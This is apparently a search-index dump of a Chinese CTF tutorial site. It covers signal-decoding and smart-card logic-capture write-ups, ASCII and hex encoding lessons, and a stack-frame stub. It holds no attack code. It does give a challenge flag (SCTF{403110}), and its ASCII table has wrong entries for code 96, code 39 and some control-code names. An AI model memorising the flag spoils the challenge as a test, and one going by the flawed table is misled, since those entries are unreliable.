1000\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a \"1\" \u6216 \"0\"\nfor i in range(0,len(sig),framerate):\n    if sig[i] &gt; 1000:\n        seq += \"1\"\n    else:\n        seq += \"0\"\nfile = open(filename + '.txt','w')\nfile.write(seq)\nfile.close()\n</code></pre> <p>\u4e4b\u540e\uff0c\u518d\u6839\u636e\u6bcf\u4e2a\u7aef\u53e3\u7684\u4fe1\u53f7\u60c5\u51b5\uff0c\u6a21\u62df\u51fa\u5c0f\u8f66\u7684\u8fd0\u52a8\u8f68\u8ff9</p> <pre><code>import turtle\n\nL_1_A1='11110011011001101101101100110110111100011110011011011011011001101111100110001101101111001101100011110110110101111010111100011011011001101101101111000110110110011110100110111100011110001111011011110011011000111101101101100111101001101101100101100100111111110001101100011011011011110001111001101101011101101001101101011110101111000110110110110101110110100110110110011110100110111100011110011011110001111011000110111101101101101101101101101100110111100001111011011010111011010011011111000110110001101101101101100101100100111111010111100011011011011011011011001101111100011011000110110110111100011110001111011011110011011000111101101101101111000110110110011011101011110001101101101111100011011000110110110111100011110110001101111011011011010111101011110001101111000111100110110111011110000110'\nL_1_A2='00001100100110010010010011001001000011100001100100100100100110010000011001110010010000110010011100001001001010000101000011100100100110010010010000111001001001100001011001000011100001110000100100001100100111000010010010011000010110010010011010011011000000001110010011100100100100001110000110010010100010010110010010100001010000111001001001001010001001011001001001100001011001000011100001100100001110000100111001000010010010010010010010010011001000011110000100100101000100101100100000111001001110010010010010011010011011000000101000011100100100100100100100110010000011100100111001001001000011100001110000100100001100100111000010010010010000111001001001100100010100001110010010010000011100100111001001001000011100001001110010000100100100101000010100001110010000111000011001001000100001111001'\nL_1_B1='11011110001111000110111100011011110110110011001101111110001100111110111100000110111101111000110110011011011111001111100110001101111000110111111001100011011110110011000011110110110011011001101111011110001101100110110111101100110000110110110000010111101111011011010110110001101111011011001100110111110100111000110111110011111001100011011011011111010011100011011110110011000011110110110011001111011011001101101101100110110110110110111111000110011110110011001101101111101001110001111101101101011011000110110110110000010111101101111100110110001101101111110001100111110110110101101100011011110110110011011001101111011110001101100110110111111001100011011110001110111110011011000110111110110110101101100011011110110110011011011011001101101101111100111110011000111101101100110011011111110011000011'\nL_1_B2='00100001110000111001000011100100001001001100110010000001110011000001000011111001000010000111001001100100100000110000011001110010000111001000000110011100100001001100111100001001001100100110010000100001110010011001001000010011001111001001001111101000010000100100101001001110010000100100110011001000001011000111001000001100000110011100100100100000101100011100100001001100111100001001001100110000100100110010010010011001001001001001000000111001100001001100110010010000010110001110000010010010100100111001001001001111101000010010000011001001110010010000001110011000001001001010010011100100001001001100100110010000100001110010011001001000000110011100100001110001000001100100111001000001001001010010011100100001001001100100100100110010010010000011000001100111000010010011001100100000001100111100'\nL_1_EnA='11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111011111111111111111111111111111111111111111111111111111101111110111111111110000000000000101111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111110111111101111111111110000000000000111111111111111111111111111111111111111011111111011111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111011111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'\nL_1_EnB='11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111011111111111111111111111111111111111111111111111111111101111110111111111110000000000000101111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111110111111101111111111110000000000000111111111111111111111111111111111111111011111111011111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111011111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'\nL_2_A1='11110011011001101101101100110110111100011110011011011011011001101111100110001101101111001101100011110110110101111010111100011011011001101101101111000110110110011110100110111100011110001111011011110011011000111101101101100111101001101101100101100100111111110001101100011011011011110001111001101101011101101001101101011110101111000110110110110101110110100110110110011110100110111100011110011011110001111011000110111101101101101101101101101100110111100001111011011010111011010011011111000110110001101101101101100101100100111111010111100011011011011011011011001101111100011011000110110110111100011110001111011011110011011000111101101101101111000110110110011011101011110001101101101111100011011000110110110111100011110110001101111011011011010111101011110001101111000111100110110111011110000110'\nL_2_A2='00001100100110010010010011001001000011100001100100100100100110010000011001110010010000110010011100001001001010000101000011100100100110010010010000111001001001100001011001000011100001110000100100001100100111000010010010011000010110010010011010011011000000001110010011100100100100001110000110010010100010010110010010100001010000111001001001001010001001011001001001100001011001000011100001100100001110000100111001000010010010010010010010010011001000011110000100100101000100101100100000111001001110010010010010011010011011000000101000011100100100100100100100110010000011100100111001001001000011100001110000100100001100100111000010010010010000111001001001100100010100001110010010010000011100100111001001001000011100001001110010000100100100101000010100001110010000111000011001001000100001111001'\nL_2_B1='11011110001111000110111100011011110110110011001101111110001100111110111100000110111101111000110110011011011111001111100110001101111000110111111001100011011110110011000011110110110011011001101111011110001101100110110111101100110000110110110000010111101111011011010110110001101111011011001100110111110100111000110111110011111001100011011011011111010011100011011110110011000011110110110011001111011011001101101101100110110110110110111111000110011110110011001101101111101001110001111101101101011011000110110110110000010111101101111100110110001101101111110001100111110110110101101100011011110110110011011001101111011110001101100110110111111001100011011110001110111110011011000110111110110110101101100011011110110110011011011011001101101101111100111110011000111101101100110011011111110011000011'\nL_2_B2='00100001110000111001000011100100001001001100110010000001110011000001000011111001000010000111001001100100100000110000011001110010000111001000000110011100100001001100111100001001001100100110010000100001110010011001001000010011001111001001001111101000010000100100101001001110010000100100110011001000001011000111001000001100000110011100100100100000101100011100100001001100111100001001001100110000100100110010010010011001001001001001000000111001100001001100110010010000010110001110000010010010100100111001001001001111101000010010000011001001110010010000001110011000001001001010010011100100001001001100100110010000100001110010011001001000000110011100100001110001000001100100111001000001001001010010011100100001001001100100100100110010010010000011000001100111000010010011001100100000001100111100'\nL_2_EnA='11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111011111111111111111111111111111111111111111111111111111101111110111111111110000000000000101111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111110111111101111111111110000000000000111111111111111111111111111111111111111011111111011111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111011111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'\nL_2_EnB='11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111011111111111111111111111111111111111111111111111111111101111110111111111110000000000000101111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110111111110111111101111111111110000000000000111111111111111111111111111111111111111011111111011111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111011111111011111110111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'\n\npath = '' #1\u4e3a\u524d\u8fdb2\u4e3a\u540e\u90003\u4e3a\u5de6\u8f6c4\u4e3a\u53f3\u8f6c\nfront_1 = '' #1\u4e3a\u6b63\u8f6c2\u4e3a\u53cd\u8f6c0\u4e3a\u505c\u6b62\nfront_2 = ''\nback_1 = ''\nback_2 = ''\n\nfor i in range(0,len(L_1_EnA)):\n    if L_1_EnA[i] == '1':\n        if L_1_A1[i] == '1' and L_1_A2[i] == '0':\n            front_1 = 1\n        elif L_1_A1[i] == '0' and L_1_A2[i] == '1':\n            front_1 = 2\n        else:\n            front_1 = 0\n    else:\n        front_1 = 0\n    if L_1_EnB[i] == '1':\n        if L_1_B1[i] == '1' and L_1_B2[i] == '0':\n            front_2 = 1\n        elif L_1_B1[i] == '0' and L_1_B2[i] == '1':\n            front_2 = 2\n        else:\n            front_2 = 0\n    else:\n        front_2 = 0\n    if L_2_EnA[i] == '1':\n        if L_2_A1[i] == '1' and L_2_A2[i] == '0':\n            back_1 = 1\n        elif L_2_A1[i] == '0' and L_2_A2[i] == '1':\n            back_1 = 2\n        else:\n            back_1 = 0\n    else:\n        back_1 = 0\n    if L_2_EnB[i] == '1':\n        if L_2_B1[i] == '1' and L_2_B2[i] == '0':\n            back_2 = 1\n        elif L_2_B1[i] == '0' and L_2_B2[i] == '1':\n            back_2 = 2\n        else:\n            back_2 = 0\n    else:\n        back_2 = 0\n    if front_1 == 1 and front_2 == 1 and back_1 == 1 and back_2 == 1:\n        path += '1'\n    elif front_1 == 2 and front_2 == 2 and back_1 == 2 and back_2 == 2:\n        path += '2'\n    elif front_1 == 2 and front_2 == 1 and back_1 == 2 and back_2 == 1:\n        path += '3'\n    elif front_1 == 1 and front_2 == 2 and back_1 == 1 and back_2 == 2:\n        path += '4'\n    else:\n        path += '5'\nturtle.left(90)\nfor i in path:\n    if i == '1':\n        turtle.forward(5)\n    elif i == '2':\n        turtle.backward(5)\n    elif i == '3':\n        turtle.left(90)\n    elif i == '4':\n        turtle.right(90)\nturtle.mainloop()\n</code></pre> <p></p>"},{"location":"Misc/Chapter7/7-7/","title":"4442 \u5f0f\u63a5\u89e6\u5361\u9690\u5199","text":""},{"location":"Misc/Chapter7/7-7/#4442-\u5f0f\u63a5\u89e6\u5361\u9690\u5199","title":"4442 \u5f0f\u63a5\u89e6\u5361\u9690\u5199","text":"<p>\u4e0b\u8f7d\u5f97\u5230 logicdata \u683c\u5f0f\u6587\u4ef6</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u6709\u65f6\u949f\u7535\u5e73clk\u548c\u6570\u636e\u7535\u5e73data\u3002\u67e54442\u5361\u624b\u518c\u53ef\u4ee5\u5f97\u77e5\u6307\u4ee4\u683c\u5f0f\u4e3a\uff1a</p> <ol> <li>\u6bcf\u4e2a\u6307\u4ee4\u4ece\u65f6\u949f\u9ad8\u7535\u5e73\u65f6\u6570\u636e\u4e0b\u964d\u6cbf\u540e\u5f00\u59cb\uff0c\u6570\u636e\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u7684\u987a\u5e8f\u53d1\u9001</li> </ol> <p>\u6bcf\u4e2a\u547d\u4ee4\u7531\u4e09\u4e2a\u5b57\u8282\u7ec4\u6210\uff1a\u63a7\u5236\u5b57\u8282\u3001\u5730\u5740\u5b57\u8282\u3001\u6570\u636e\u5b57\u8282\u3002\u65f6\u949f\u9ad8\u7535\u5e73\u6570\u636e\u7535\u5e73\u4e0a\u5347\u6cbf\u4ee3\u8868\u672c\u6b21\u547d\u4ee4\u7ed3\u675f</p> <ol> <li>\u4e0e\u52a0\u5bc6\u5bc6\u94a5\u76f8\u5173\u7684\u6307\u4ee4\u7c7b\u578b\u662f 0x33\uff0c\u7528\u4e8e\u6821\u9a8c\u53e3\u4ee4</li> </ol> <p>\u800c 4442 \u5361\u7684\u53e3\u4ee4\u4e3a\u4e09\u5b57\u8282</p> <p>\u56e0\u6b64\u6211\u4eec\u9700\u8981\u627e\u5230\u8fd9\u6837\u4e00\u4e32\u6570\u636e\uff1a</p> <pre><code>0x33 0x01 flag[1] 0x33 0x02 flag[2] 0x33 0x03 flag[3]\n</code></pre> <p>\u5728 6s950ms \u5904\u627e\u5230\u8fd9\u4e32\u6570\u636e\uff1a</p> <p></p> <p>\u7b2c\u4e00\u6bb5</p> <p></p> <p>\u56e0\u6b64\u5bc6\u94a5\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f 0x40</p> <p>\u91cd\u70b9\u662f\u5728\u65f6\u949f\u7535\u5e73\u627e\u5230\u5f00\u59cb\u548c\u7ed3\u675f\u6807\u5fd7\uff08\u8868\u73b0\u4e3a\u4e00\u4e2a\u8f83\u5bbd\u7684\u5cf0\uff09\uff0c\u7136\u540e\u4ece\u6570\u636e\u7535\u5e73\u6309\u4ece\u9ad8\u5230\u4f4e\u8bfb\u53d6\u6570\u636e</p> <p>\u7b2c\u4e8c\u6bb5\u548c\u7b2c\u4e09\u6bb5\u5c31\u5728\u7b2c\u4e00\u6bb5\u540e\uff0c\u5404\u76f8\u9694 3 \u4f4d\u4ee5\u6b64\u7c7b\u63a8\u5f97\u5230 flag</p> <pre><code>SCTF{403110}\n</code></pre>"},{"location":"Misc/encoding/ASCII/","title":"ASCII","text":""},{"location":"Misc/encoding/ASCII/#ascii\u662f\u4ec0\u4e48","title":"ASCII\u662f\u4ec0\u4e48\uff1f","text":"<p>ASCII\uff08American Standard Code for Information Interchange\uff0c\u7f8e\u56fd\u4fe1\u606f\u4ea4\u6362\u6807\u51c6\u4ee3\u7801\uff09\u662f\u6700\u65e9\u88ab\u5e7f\u6cdb\u91c7\u7528\u7684\u5b57\u7b26\u7f16\u7801\u6807\u51c6\u4e4b\u4e00\u3002\u5b83\u4e3b\u8981\u7528\u4e8e\u663e\u793a\u73b0\u4ee3\u82f1\u8bed\uff0c\u800c\u5176\u6269\u5c55\u7248\u672c\u5ef6\u4f38\u7f8e\u56fd\u6807\u51c6\u4fe1\u606f\u4ea4\u6362\u7801\u5219\u53ef\u4ee5\u90e8\u5206\u652f\u6301\u5176\u4ed6\u897f\u6b27\u8bed\u8a00\uff0c\u5e76\u7b49\u540c\u4e8e\u56fd\u9645\u6807\u51c6ISO/IEC 646\u3002\u5b83\u628a\u5b57\u7b26\uff08\u5982\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u6807\u70b9\u7b26\u53f7\u3001\u63a7\u5236\u7b26\u53f7\u7b49\uff09\u6620\u5c04\u4e3a 7 \u4f4d\u4e8c\u8fdb\u5236\u6570\uff080\u2013127\uff09\u3002\u4e5f\u662f\u73b0\u4ee3\u6240\u6709\u5b57\u7b26\u7f16\u7801\uff08\u5982 UTF-8\u3001Unicode\uff09\u7684\u57fa\u7840\u3002</p>"},{"location":"Misc/encoding/ASCII/#ascii-\u7684\u8bbe\u8ba1\u539f\u5219","title":"ASCII \u7684\u8bbe\u8ba1\u539f\u5219","text":""},{"location":"Misc/encoding/ASCII/#1-\u4f7f\u7528-7-\u4f4d\u7f16\u7801","title":"1. \u4f7f\u7528 7 \u4f4d\u7f16\u7801","text":"<ul> <li>\u4e00\u5171 128 \u4e2a\u7f16\u7801\uff1a0\u2013127</li> <li>\u8bbe\u8ba1\u4e4b\u521d\u662f\u4e3a\u4e86\u517c\u5bb9\u5f53\u65f6\u7684\u7535\u4f20\u6253\u5b57\u673a\u3001\u7ec8\u7aef\u548c\u65e9\u671f\u8ba1\u7b97\u673a\u3002</li> </ul>"},{"location":"Misc/encoding/ASCII/#2-\u517c\u5bb9\u82f1\u8bed\u4f7f\u7528","title":"2. \u517c\u5bb9\u82f1\u8bed\u4f7f\u7528","text":"<p>\u5305\u542b\u4e86\uff1a</p> <ul> <li>26 \u4e2a\u5927\u5199\u5b57\u6bcd A\u2013Z</li> <li>26 \u4e2a\u5c0f\u5199\u5b57\u6bcd a\u2013z</li> <li>10 \u4e2a\u6570\u5b57 0\u20139</li> <li>\u57fa\u672c\u6807\u70b9\u7b26\u53f7\uff08\u5982 <code>. , ! ?</code> \u7b49\uff09</li> <li>\u5e38\u89c1\u64cd\u4f5c\u7b26\uff08\u5982 <code>+ - * / =</code>\uff09</li> <li>\u63a7\u5236\u5b57\u7b26\uff08\u5982\u6362\u884c\u3001\u54cd\u94c3\u7b49\uff09</li> </ul>"},{"location":"Misc/encoding/ASCII/#ascii-\u7684\u5185\u90e8\u7ed3\u6784","title":"ASCII \u7684\u5185\u90e8\u7ed3\u6784","text":"<p>ASCII 128 \u4e2a\u5b57\u7b26\u53ef\u5206\u4e3a\u4e24\u5927\u7c7b\uff1a</p>"},{"location":"Misc/encoding/ASCII/#\u63a7\u5236\u5b57\u7b26031--127","title":"\u63a7\u5236\u5b57\u7b26\uff080\u201331 &amp; 127\uff09","text":"<p>\u4e0d\u53ef\u6253\u5370\uff0c\u7528\u4e8e\u63a7\u5236\u8bbe\u5907\u548c\u683c\u5f0f\u3002\u5178\u578b\u5982\uff1a</p> <ul> <li><code>0</code>\uff1aNUL \u7a7a\u5b57\u7b26</li> <li><code>7</code>\uff1aBEL\uff08\u54cd\u94c3\uff09</li> <li><code>8</code>\uff1aBS \u56de\u9000</li> <li><code>9</code>\uff1aTAB \u6c34\u5e73\u5236\u8868\u7b26</li> <li><code>10</code>\uff1aLF \u6362\u884c</li> <li><code>13</code>\uff1aCR \u56de\u8f66</li> <li><code>27</code>\uff1aESC \u8f6c\u4e49</li> <li><code>127</code>\uff1aDEL \u5220\u9664</li> </ul> <p>\u8fd9\u4e9b\u7b26\u53f7\u6e90\u4e8e\u65e9\u671f\u7535\u4f20\u7cfb\u7edf\uff0c\u4eca\u5929\u4ecd\u5728\u7ec8\u7aef\u4e2d\u6709\u7528\u3002</p>"},{"location":"Misc/encoding/ASCII/#\u53ef\u6253\u5370\u5b57\u7b2632126","title":"\u53ef\u6253\u5370\u5b57\u7b26\uff0832\u2013126\uff09","text":"<p>\u5305\u62ec\uff1a</p> <ul> <li>\u7a7a\u683c\uff0832\uff09</li> <li>\u6807\u70b9\u7b26\u53f7\uff0833\u201347\uff09</li> <li>\u6570\u5b57 0\u20139\uff0848\u201357\uff09</li> <li>\u5927\u5199\u5b57\u6bcd A\u2013Z\uff0865\u201390\uff09</li> <li>\u5c0f\u5199\u5b57\u6bcd a\u2013z\uff0897\u2013122\uff09</li> <li>\u5176\u4ed6\u7b26\u53f7\uff08\u5982 <code>@ # $ % ^ &amp; *</code>\uff09</li> </ul>"},{"location":"Misc/encoding/ASCII/#ascii-\u7684\u4e0d\u8db3","title":"ASCII \u7684\u4e0d\u8db3","text":"<ul> <li>\u53ea\u80fd\u8868\u793a**\u82f1\u6587\u5b57\u7b26**\uff0c\u65e0\u6cd5\u8986\u76d6\u5176\u4ed6\u8bed\u8a00\uff08\u4e2d\u6587\u3001\u65e5\u6587\u7b49\uff09</li> <li>\u65e0\u6cd5\u6db5\u76d6\u6570\u5b66\u7b26\u53f7\u3001emoji\u3001\u56fd\u9645\u7b26\u53f7\u7b49    \u2192 \u56e0\u6b64\u4ea7\u751f\u4e86 \u6269\u5c55 ASCII\uff088 \u4f4d\uff09 \u4e0e\u540e\u6765 Unicode \u7684\u53d1\u5c55\u3002</li> </ul>"},{"location":"Misc/encoding/ASCII/#ascii\u8868","title":"ASCII\u8868","text":"ASCII\u503c \u63a7\u5236\u5b57\u7b26 ASCII\u503c \u63a7\u5236\u5b57\u7b26 ASCII\u503c \u63a7\u5236\u5b57\u7b26 ASCII\u503c \u63a7\u5236\u5b57\u7b26 0 NUT 32 (space) 64 @ 96 \u3001 1 SOH 33 ! 65 A 97 a 2 STX 34 \" 66 B 98 b 3 ETX 35 # 67 C 99 c 4 EOT 36 $ 68 D 100 d 5 ENQ 37 % 69 E 101 e 6 ACK 38 &amp; 70 F 102 f 7 BEL 39 , 71 G 103 g 8 BS 40 ( 72 H 104 h 9 HT 41 ) 73 I 105 i 10 LF 42 * 74 J 106 j 11 VT 43 + 75 K 107 k 12 FF 44 , 76 L 108 l 13 CR 45 - 77 M 109 m 14 SO 46 . 78 N 110 n 15 SI 47 / 79 O 111 o 16 DLE 48 0 80 P 112 p 17 DCI 49 1 81 Q 113 q 18 DC2 50 2 82 R 114 r 19 DC3 51 3 83 S 115 s 20 DC4 52 4 84 T 116 t 21 NAK 53 5 85 U 117 u 22 SYN 54 6 86 V 118 v 23 TB 55 7 87 W 119 w 24 CAN 56 8 88 X 120 x 25 EM 57 9 89 Y 121 y 26 SUB 58 : 90 Z 122 z 27 ESC 59 ; 91 [ 123 { 28 FS 60 &lt; 92 \\ 124 | 29 GS 61 = 93 ] 125 } 30 RS 62 &gt; 94 ^ 126 ` 31 US 63 ? 95 _ 127 DEL <p>\u5176\u5b9e\u4f60\u4e5f\u53ef\u4ee5\u8bb0\u4e00\u4e9b\u5e38\u7528\u7684\u8303\u56f4\u503c\uff1a</p> \u7c7b\u578b \u8303\u56f4\uff08\u5341\u8fdb\u5236\uff09 \u5341\u516d\u8fdb\u5236 \u8bf4\u660e \u6570\u5b57 '0'\u2013'9' 48  \u2013 57 0x30  \u2013 0x39 '0'  = 48, `'5' = 53 \u5927\u5199\u5b57\u6bcd 'A'\u2013'Z' 65  \u2013 90 0x41  \u2013 0x5A 'A'  = 65, `'Z' = 90 \u5c0f\u5199\u5b57\u6bcd 'a'\u2013'z' 97  \u2013 122 0x61  \u2013 0x7A 'a'  = 97, `'z' = 122 \u7a7a\u683c 32 0x20 \u6700\u5e38\u89c1\u63a7\u5236\u5b57\u7b26"},{"location":"Misc/encoding/Hex/","title":"Hex\uff08\u5341\u516d\u8fdb\u5236\u7f16\u7801\uff09","text":""},{"location":"Misc/encoding/Hex/#\u4ec0\u4e48\u662f16\u8fdb\u5236\u7f16\u7801","title":"\u4ec0\u4e48\u662f16\u8fdb\u5236\u7f16\u7801\uff1f","text":"<p>16 \u8fdb\u5236\u7f16\u7801\u5c31\u662f\u7528\u5341\u516d\u8fdb\u5236\uff080\u20139 + A\u2013F\uff09 \u6765\u8868\u793a\u6570\u636e\u7684\u4e00\u79cd\u65b9\u5f0f\u3002CTF \u4e2d\u7ecf\u5e38\u4f1a\u5229\u7528 Hex \u6765\u9690\u85cf\u5b57\u7b26\u4e32\u3001Payload\u3001Shellcode \u6216\u6587\u4ef6\u5185\u5bb9\u3002</p>"},{"location":"Misc/encoding/Hex/#16-\u8fdb\u5236\u7f16\u7801\u7684\u57fa\u672c\u539f\u7406","title":"16 \u8fdb\u5236\u7f16\u7801\u7684\u57fa\u672c\u539f\u7406","text":"<p>\u6587\u672c\u8f6c16\u8fdb\u5236\u7684\u539f\u7406\u662f\u9996\u5148\u5c06\u6587\u672c\u4e2d\u7684\u6bcf\u4e2a\u5b57\u7b26\u6839\u636e\u5176\u5728\u7279\u5b9a\u5b57\u7b26\u96c6\uff08\u5982ASCII\u7801\u3001Unicode\u7b49\uff09\u4e2d\u7684\u7f16\u7801\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\uff0c\u7136\u540e\u5c06\u4e8c\u8fdb\u5236\u6570\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u6570\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u4e00\u4e2a\u5b57\u7b26\u5728\u8ba1\u7b97\u673a\u4e2d\u901a\u5e38\u5360\u7528\u4e00\u4e2a\u6216\u591a\u4e2a\u5b57\u8282\uff08\u4f8b\u5982\uff0c\u82f1\u6587\u5b57\u7b26\u5360\u4e00\u4e2a\u5b57\u8282\uff0c\u6c49\u5b57\u901a\u5e38\u5360\u4e24\u4e2a\u6216\u66f4\u591a\u5b57\u8282\uff09\uff0c\u7136\u540e\u5c06\u8fd9\u4e9b\u5b57\u8282\u7684\u4e8c\u8fdb\u5236\u503c\u6309\u987a\u5e8f\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002</p>"},{"location":"Misc/encoding/Hex/#16\u8fdb\u5236\u4e0eascii","title":"16\u8fdb\u5236\u4e0eASCII","text":"<p>ASCII \u662f\u4e00\u79cd\u5b57\u7b26\u7f16\u7801\u65b9\u5f0f\uff0c\u6bcf\u4e2a\u5b57\u7b26\u7528 1 \u4e2a\u5b57\u8282\uff088 bit\uff09 \u8868\u793a\u3002</p> <p>\u4f8b\u5982\uff1a</p> <ul> <li>\u5b57\u7b26 A \u21d2 ASCII \u5341\u8fdb\u5236 65</li> <li>\u4e8c\u8fdb\u5236\uff1a<code>01000001</code></li> </ul> <p>\u4e00\u4e2a\u5b57\u8282 = 8 bit = \u6070\u597d\u53ef\u4ee5\u7528\u4e24\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u5b57\u8868\u793a</p> <p>\u56e0\u4e3a\uff1a</p> <ul> <li>\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u5b57 = 4 bit</li> <li>\u6240\u4ee5 \u4e24\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u5b57 = 8 bit = 1 \u5b57\u8282</li> </ul> <p>\u5373\uff1a</p> <pre><code>1 \u5b57\u8282  &lt;=&gt;  2 \u4e2a Hex \u5b57\u7b26  &lt;=&gt;  1 \u4e2a ASCII \u5b57\u7b26\n</code></pre> <p>\u4e3e\u4f8b\uff1a</p> ASCII \u5b57\u7b26 ASCII \u5341\u8fdb\u5236 \u4e8c\u8fdb\u5236 16 \u8fdb\u5236 A 65 01000001 41 B 66 01000010 42 a 97 01100001 61 0 48 00110000 30 \u7a7a\u683c 32 00100000 20 <p>\u6240\u4ee5 Hex \u548c ASCII \u7684\u5173\u7cfb\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a</p> <p>Hex \u662f ASCII \u5b57\u8282\u7684\u5341\u516d\u8fdb\u5236\u8868\u793a\u65b9\u5f0f\u3002</p>"},{"location":"Misc/encoding/Hex/#\u4f8b\u5b50","title":"\u4f8b\u5b50","text":""},{"location":"Misc/encoding/Hex/#16\u8fdb\u5236\u8f6c\u636210\u8fdb\u5236","title":"16\u8fdb\u5236\u8f6c\u636210\u8fdb\u5236","text":"<p>16\u8fdb\u5236\u523010\u8fdb\u5236\u7684\u8f6c\u6362\uff0c\u5176\u5b9e\u548c2\u8fdb\u5236\u523010\u8fdb\u5236\u7684\u8f6c\u6362\u65b9\u5f0f\u4e00\u81f4\uff0c\u90fd\u662f\u6309\u4f4d\u7684\u6743\u503c\u5c55\u5f00\u3002</p> <p>\u57282\u8fdb\u5236\u7684\u60c5\u51b5\u4e0b\uff0c\u4f4d\u6743\u503c\u662f2\u7684\u5e42\u6b21\uff0c16\u8fdb\u5236\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u662f16\u7684\u5e42\u6b21\uff0c\u4ece\u53f3\u5f80\u5de6\u4f9d\u6b21\u6392\u5217\u5982\u4e0b\uff1a $$</p> <p>16^0 \u3001 16^1\u3001 16^2\u3001 16^3\u3001 16^4 \u3001 16^5\u3001 16^6\u3001 16^7 \u300116^8 \u3001 16^9\u3001 16^10\u3001 16^11 16^12 \u3001 16^13\u3001 16^14\u3001 16^15\uff0c\u5176\u4e2dA=10, B=11, C=12, D=13, E=14, F=15\u3002 $$</p> <p>\u4f8b\u5982\uff1a66\uff08f\uff09\u548c6c\uff08l\uff09 $$ 66=6\u221716<sup>1+6\u221716</sup>0\\</p> <p>=6\u221716+6\\</p> <p>=96+6\\</p> <p>=102 $$</p> \\[ 6\ud835\udc50=6\u221716^1+12\u221716^0\\\\      =6\u221716+12\\\\      =96+12\\\\      =108 \\]"},{"location":"Misc/encoding/Hex/#\u5b57\u7b26\u4e32ctf","title":"\u5b57\u7b26\u4e32\uff1a\"CTF\"","text":"<p>ASCII \u5b57\u8282\u4e3a\uff1a</p> <pre><code>C \u2192 43\nT \u2192 54\nF \u2192 46\n</code></pre> <p>\u5341\u516d\u8fdb\u5236\u5199\u6210\uff1a</p> <pre><code>435446\n</code></pre> <p>\u4e5f\u5c31\u662f\uff1a</p> <pre><code>\"CTF\" = 0x43 0x54 0x46\n</code></pre>"},{"location":"Misc/encoding/Hex/#\u5b57\u7b26\u4e32hello","title":"\u5b57\u7b26\u4e32\uff1a\"Hello\"","text":"<p>ASCII \u2192 Hex\uff1a</p> H e l l o 48 65 6C 6C 6F <pre><code>48656c6c6f\n</code></pre>"},{"location":"Misc/encoding/Hex/#\u5b57\u7b26\u4e32flag","title":"\u5b57\u7b26\u4e32\uff1a\"flag\"","text":"<pre><code>66 6C 61 67\n</code></pre>"},{"location":"Pwn/","title":"\u4ecb\u7ecd","text":"<p>\u4f5c\u8005\u6b63\u5728\u7f16\u5199\u4e2d</p>"},{"location":"Pwn/Chapter1/","title":"Index","text":""},{"location":"Pwn/Chapter1/#\u6808\u7684\u57fa\u672c\u7ed3\u6784","title":"\u6808\u7684\u57fa\u672c\u7ed3\u6784","text":"<p>\u6808\u5e27\u5305\u542b\uff1a</p> <ul> <li>\u5c40\u90e8\u53d8\u91cf\uff1a\u8be5\u51fd\u6570\u5b9a\u4e49\u7684\u5c40\u90e8\u53d8\u91cf</li> <li>\u8fd4\u56de\u5730\u5740\uff1a\u51fd\u6570\u8c03\u7528\u5b8c\u6210\u540e\uff0c\u7a0b\u5e8f\u5c06\u8df3\u8f6c\u5230\u8be5\u5730\u5740</li> <li>\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u72b6\u6001\uff1a\u4fdd\u5b58\u8c03\u7528\u8005\u51fd\u6570\u7684\u5bc4\u5b58\u5668\u72b6\u6001</li> </ul> <p>\u6808\u7684\u589e\u957f\u901a\u5e38\u662f\u5411\u4f4e\u5730\u5740\u65b9\u5411\u7684\uff0c\u800c\u6808\u7684\u201c\u9876\u7aef\u201d\u4f1a\u968f\u7740\u51fd\u6570\u8c03\u7528\u7684\u6df1\u5165\u800c\u5411\u4e0b\u79fb\u52a8</p> 